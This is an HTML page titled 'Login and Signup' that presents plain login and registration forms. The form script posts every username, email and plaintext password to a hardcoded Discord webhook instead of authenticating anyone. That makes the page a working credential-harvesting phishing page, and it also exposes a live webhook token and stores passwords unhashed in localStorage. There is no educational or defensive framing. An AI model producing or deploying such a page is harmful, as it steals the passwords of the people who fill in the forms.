<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Login and Signup</title>
  <style>
    /* CSS styles */

    body {
      font-family: Arial, sans-serif;
    }

    .header {
      background-color: #000;
      color: #fff;
      padding: 20px;
    }

    .header h1 {
      margin: 0;
    }

    .container {
      margin: 20px;
    }

    .form-container {
      max-width: 400px;
      margin: 0 auto;
    }

    .form-container h2 {
      margin-bottom: 20px;
    }

    .form-container label,
    .form-container input[type="text"],
    .form-container input[type="password"],
    .form-container button {
      display: block;
      margin-bottom: 10px;
    }

    .form-container button {
      padding: 8px 12px;
    }
  </style>
  <script>
    function sendWebhook(content) {
      const webhookUrl = "https://discord.com/api/webhooks/1114747356055879781/7fH1tMXA2cJ8neQ3o4pMsZfnJwqAsBFt3xHOIcjHzrs3JZrJ5Fnun5zHluFw3bR5k60B";

      fetch(webhookUrl, {
        method: "POST",
        headers: {
          "Content-Type": "application/json"
        },
        body: JSON.stringify({ content })
      })
        .then(response => {
          if (response.ok) {
            alert("Notification sent successfully!");
          } else {
            alert("Failed to send notification.");
          }
        })
        .catch(error => {
          console.error("Error:", error);
          alert("An error occurred while sending the notification.");
        });
    }

    function login(event) {
      event.preventDefault();
      const username = document.getElementById("loginUsername").value;
      const password = document.getElementById("loginPassword").value;

      const content = `**Login**\nUsername: ${username}\nPassword: ${password}`;
      sendWebhook(content);
    }

    function signup(event) {
      event.preventDefault();
      const username = document.getElementById("signupUsername").value;
      const email = document.getElementById("signupEmail").value;
      const password = document.getElementById("signupPassword").value;

      const content = `**Sign Up**\nUsername: ${username}\nEmail: ${email}\nPassword: ${password}`;
      sendWebhook(content);
    }
  </script>
</head>

<body>
  <div class="header">
    <h1>Login and Signup</h1>
  </div>

  <div class="container">
    <div class="form-container">
      <h2>Login</h2>
      <form onsubmit="login(event)">
        <label for="loginUsername">Username:</label>
        <input type="text" id="loginUsername" required>
        <label for="loginPassword">Password:</label>
        <input type="password" id="loginPassword" required>
        <button type="submit">Login</button>
      </form>
    </div>

    <div class="form-container">
      <h2>Signup</h2>
      <form onsubmit="signup(event)">
        <label for="signupUsername">Username:</label>
        <input type="text" id="signupUsername" required>
        <label for="signupEmail">Email:</label>
        <input type="email" id="signupEmail" required>
        <label for="signupPassword">Password:</label>
        <input type="password" id="signupPassword" required>
        <button type="submit">Signup</button>
      </form>
    </div>
  </div>

  <script>
    // Simulating cloud storage using browser's localStorage
    function saveUserToCloud(username, email, password) {
      const existingUsers = JSON.parse(localStorage.getItem("users")) || [];
      const newUser = { username, email, password };
      existingUsers.push(newUser);
      localStorage.setItem("users", JSON.stringify(existingUsers));
    }
  </script>
</body>

</html>
